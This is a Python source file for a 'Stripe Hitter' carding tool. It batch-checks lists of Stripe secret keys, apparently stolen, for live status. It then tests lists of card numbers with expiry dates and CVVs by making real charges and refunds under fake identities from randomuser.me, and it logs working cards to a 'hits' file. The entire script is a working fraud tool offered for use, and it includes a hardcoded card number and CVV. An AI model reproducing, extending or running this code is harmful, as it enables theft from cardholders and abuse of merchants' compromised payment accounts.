import os
import requests
import stripe
import colorama
import json
import sys
from colorama import Fore, Back, Style
import tkinter as tk
from tkinter import filedialog
from tkinter import font
import time

bad = 0
good = 0

root = tk.Tk()
root.withdraw()


class backround:
    def skoutput(type, skpath, sk):
        if type == "get":
            with open(skpath, "r") as f:
                lines = f.readlines()
                if not lines:
                    sentinfo("bad", "SK File is empty.")
                    sys.exit()
                return lines[0].strip()
        if type == "change":
            with open(skpath, "r") as a:
                lines = a.readlines()
            with open(skpath, "w") as f:
                for line in lines:
                    if line.strip("\n") != sk:
                        f.write(line)
    def clean():
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def errorparsing(e, skpath, sk):
        if "Your account cannot currently make live charges. If you are the site owner, please activate your account at https://dashboard.stripe.com/account/onboarding to remove this limitation. If you are a customer trying to make a purchase, please contact the owner of this site. Your transaction has not been processed." in str(e):
            sentinfo("bad", "Stripe key is Dead!")
            backround.skoutput("change" ,skpath, sk)
        elif "Your card was declined." in str(e):
            #sentinfo("bad", "CARD DECLINED")
            pass
        elif "Your card number is incorrect." in str(e):
            #sentinfo("bad", "CARD INCORRECT| CARD NUMBER IS INCORRECT")
            pass
        elif "Your card's security code is invalid." in str(e):
            pass
            #sentinfo("bad", "CARD INCORRECT| CARD SECURITY CODE IS INCORRECT")
        elif "Your card's expiration year is invalid." in str(e):
            pass
            #sentinfo("bad", "CARD INCORRECT| CARD EXPIRATION YEAR IS INVALID")
        else:
            pass
            #sentinfo("bad", str(e))
    def getfakedetails(type, nat):
    #can return name, password, useragent
        apiendpoint = f"https://api.randomuser.me?nat={nat}"
        result = json.loads(requests.request("GET", apiendpoint).text)
        if type == "namefirst":
            return result["results"][0]["name"]["first"]
        if type == "namelast":
            return result["results"][0]["name"]["last"]
        if type == "namefirstandlast":
            return result["results"][0]["name"]["first"] + " " + result["results"][0]["name"]["last"]
        if type == "dob":
            return result["results"][0]["dob"]["date"]
        if type == "street":
            return str(result["results"][0]["location"]["street"]["name"]) + " " + str(result["results"][0]["location"]["street"]["number"])
        if type == "city":
            return result["results"][0]["location"]["city"]
        if type == "postalcode":
            return result["results"][0]["location"]["postcode"]
        if type == "phone":
            return result["results"][0]["phone"][1:].replace("-", "")
        if type == "state":
            return result["results"][0]["location"]["state"]
        if type == "nat":
            return result["results"][0]["nat"]
    
    def logo():
        backround.clean()
        os.system("title Stripe Hitter")
        return(
            print(colorama.Fore.CYAN),
            print("Welcome to the Hitter"),
            print(colorama.Fore.RESET),
        )

def sentinfo(case, message):
    if case == "info":
        print(Fore.BLUE + "INFO: " + message + Fore.RESET)
    elif case == "bad":
        print(Fore.RED + "BAD: " + message + Fore.RESET)
    elif case == "good":
        print(Fore.GREEN + "GOOD: " + message + Fore.RESET)
    elif case == "failed":
        print(Fore.RED + "FAILED: " + message + Fore.RESET)

def generate_card_token(skpath ,sk, cardnumber, expmonth, expyear, cvv):
    api_key = sk
    url = "https://api.stripe.com/v1/tokens"
    payload = {
        "card[number]": str(cardnumber),
        "card[exp_month]": int(expmonth),
        "card[exp_year]": int(expyear),
        "card[cvc]": str(cvv),
    }
    headers = {
        'Authorization': 'Bearer ' + api_key,
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = requests.post(url, headers=headers, data=payload)
    response_json = response.json()
    try:
        try:
            return response_json['id']
        except:
            if response_json["error"]['type'] == "card_error":
                backround.errorparsing(response_json["error"]['message'], skpath, sk)
            elif response_json["error"]['code'] == "testmode_charges_only":
                backround.skoutput("change" ,skpath, sk)
                sentinfo("bad", "Key is dead")
    except Exception as e:
        if e == response_json["error"]['code'] == "card_declined":
            sentinfo("good", "Card Number is correct, but is declined. Decline code: " + response_json["error"]['decline_code'])
        else:
            backround.errorparsing(e, skpath, sk)

def makecustomer(sk, skpath, tokenid, nat, name, address, city, state, postalcode, phone):
    url = "https://api.stripe.com/v1/customers"
    headers = {
        'Authorization': 'Bearer ' + sk,
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    payload = {
        "name": name,
        "address[city]": city,
        "address[country]": nat,
        "address[line1]": address,
        "address[state]": state,
        "address[postal_code]": postalcode,
        "phone": phone,
        "source": tokenid,
    }
    response = requests.post(url, headers=headers, data=payload)
    response_json = response.json()
    json_data = response_json
    try:
        if json_data["livemode"] == True:
            return response_json['id']
        else:
            sentinfo("bad", "Key is dead")
            backround.skoutput("change", skpath, sk)
    except Exception as e:
        sentinfo("bad", str(e))

def skchecker2(sk):
    api_key = sk
    url = "https://api.stripe.com/v1/tokens"
    payload = {
        "card[number]": str("5215390255131323"),
        "card[exp_month]": int("02"),
        "card[exp_year]": int("2028"),
        "card[cvc]": str("775"),
    }
    headers = {
        'Authorization': 'Bearer ' + api_key,
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = requests.post(url, headers=headers, data=payload)
    response_json = response.json()
    try:
        try:
            response_json['id']
        except:
            if response_json["error"]['type'] == "card_error":
                return True
            elif response_json["error"]['code'] == "testmode_charges_only":
                return False
    except Exception as e:
        if e == response_json["error"]['code'] == "card_declined":
            return True
        else:
            return True

def checksk(sk):
    url = "https://api.stripe.com/v1/customers"
    headers = {
        'Authorization': 'Bearer ' + sk,
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    payload = {
        "name": "JEFFERSON JEFFERSON",
        "address[city]": "Hamburg",
        "address[country]": "DE",
        "address[line1]": "Hauptstrasse 1",
        "address[state]": "Hamburg",
        "address[postal_code]": "20095",
        "phone": "49173423812",
    }
    response = requests.post(url, headers=headers, data=payload)
    response_json = response.json()
    json_data = response_json
    try:
        if json_data["livemode"] == True:
            return True
        else:
            return False
    except Exception as e:
        return False

def checksks():
    global good, bad
    backround.logo()
    print("Select SK file")
    skpath = filedialog.askopenfilename( filetypes = (("Text files", "*.txt"), ("All files", "*.*")) )
    backround.logo()
    #open skpath and check every sk
    with open(skpath, "r") as f:
        lines = f.readlines()
        for line in lines:
            os.system('title Stripe Hitter - Hits: ' + str(good) + ' - Bad: ' + str(bad) + ' - Total: ' + str(good + bad))
            sk = line.strip()
            if skchecker2(sk) == True:
                sentinfo("good", "Key is good: " + sk)
                good += 1
            else:
                sentinfo("bad", "Key is bad: " + sk)
                bad += 1
                backround.skoutput("change", skpath, sk)
    input("Press enter to continue")
    main()
    


#need to make customer
def create_payment_charge(customer, sk, amount):
    api_key = sk
    #sentinfo("info", "Attempting to charge card")
    url = "https://api.stripe.com/v1/charges"
    payload = {
        "amount": int(amount) * 100,  # convert amount to cents
        "currency": 'usd',
        "description": 'WE LOVE EDP-445',
        "customer": customer,
   #     "source": tokenid,
    }
    headers = {
        'Authorization': 'Bearer ' + api_key,
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = requests.post(url, headers=headers, data=payload)
    response_json = response.json()
    try:
        if response_json['paid'] == True:
            sentinfo("good", "Payment was successful")
            sentinfo("good", "Recieved: $" + str(amount))
            sentinfo("good", "POS URL: " + str(response_json['receipt_url']))
            refund_charge(response_json['id'], headers)
            return True
        else:
            return False
    except Exception as e:
        if response_json["error"]['code'] == "card_declined":
            sentinfo("good", "Card Number is correct, but is declined. Decline code: " + response_json["error"]['decline_code'])
            return False
        elif response_json["error"]['type'] == "card_error":
            return False
        elif response_json["error"]['code'] == "missing":
            return False
        elif response_json["error"]['message'] == "Cannot charge a customer that has no active card":
            return False
        elif response_json["error"]['code'] == "parameter_missing":
            return False
        else:
            sentinfo("bad", str(e))
            return False

def refund_charge(charge_id, headers):
    url = "https://api.stripe.com/v1/refunds"
    payload = {
        "charge": charge_id,
    }
    response = requests.post(url, headers=headers, data=payload)
    response_json = response.json()
    try:
        sentinfo("info", "Refund: " + str(response_json['status']))
    except:
        sentinfo("bad", "Refund: " + str(response_json['error']['message']))

def main():
    backround.logo()
    print("----------------------------")
    print("1. Check SKs")
    print("2. Check CCs")
    print("3. Exit")
    print("----------------------------")
    choice = input("Please enter your choice: ")
    if choice == "1":
        checksks()
    elif choice == "2":
        checkcards()
    elif choice == "3":
        sys.exit()
    else:
        backround.clean()
        main()

def checkcards():
    backround.logo()
    charge = input("Enter the amount you want to charge: ")
    backround.clean()
    print("Please select your SK file")
    skpath = filedialog.askopenfilename( filetypes = (("Text files", "*.txt"), ("All files", "*.*")) )
    backround.clean()
    print("Please select your CC file")
    file = filedialog.askopenfilename( filetypes = (("Text files", "*.txt"), ("All files", "*.*")) )
    backround.clean()
    countrys = ["AU", "BR", "CA", "CH", "DE", "DK", "ES", "FI", "FR", "GB", "IE", "IN", "IR", "MX", "NL", "NO", "NZ", "RS", "TR", "UA", "US"]
    print(countrys)
    choice = input("Please enter the card country code: ").upper()
    if choice not in countrys:
        backround.clean()
        print("Please enter a valid country code")
        time.sleep(2)
        backround.clean()
        quit()
    else:
        nat = choice
        name = backround.getfakedetails("namefirstandlast", nat)
        address = backround.getfakedetails("street", nat)
        city = backround.getfakedetails("city", nat)
        state = backround.getfakedetails("state", nat)
        postalcode = backround.getfakedetails("postalcode", nat)
        phone = backround.getfakedetails("phone", nat)
        backround.clean()
        print("Please wait while we charge the cards")
        backround.logo()
        x = open(file, "r")
        for fullcc in x:
            cc, mm, yy, cvv = fullcc.split('|')
            bookcard(skpath ,charge ,cc, mm, yy, cvv, nat, name, address, city, state, postalcode, phone)
        x.close
        print("")
        input(colorama.Fore.YELLOW +"Press enter to continue | Check completed" + colorama.Fore.RESET)
        main()



def bookcard(skpath, charge, cardnumber, expmonth, expyear, cvc, nat, name, adress, city, state, zipcode, phone):
    global good, bad
    os.system('title Stripe Hitter - Hits: ' + str(good) + ' - Bad: ' + str(bad) + ' - Total: ' + str(good + bad))
    sk = backround.skoutput("get" ,skpath, "none")
    token = generate_card_token(skpath ,sk, cardnumber, expmonth, expyear, cvc)
    customer = makecustomer(sk, skpath, token, nat, name, adress, city, state, zipcode, phone)
    charge = create_payment_charge(customer, sk, charge)
    try:
        if charge == True:
            sentinfo("good", "Hit found: " + cardnumber + "|" + expmonth + "|" + expyear + "|" + cvc )
            with open ("hits.txt", "a") as myfile:
                myfile.write(cardnumber + "|" + expmonth + "|" + expyear + "|" + cvc + "\n")
                myfile.close()
            good += 1
        elif charge == False:
            #sentinfo("bad", "Card Declined: " + cardnumber + "|" + expmonth + "|" + expyear + "|" + cvc)
            bad += 1
    except Exception as e:
        sentinfo("bad", str(e))


            
    


if __name__ == "__main__":
    main()
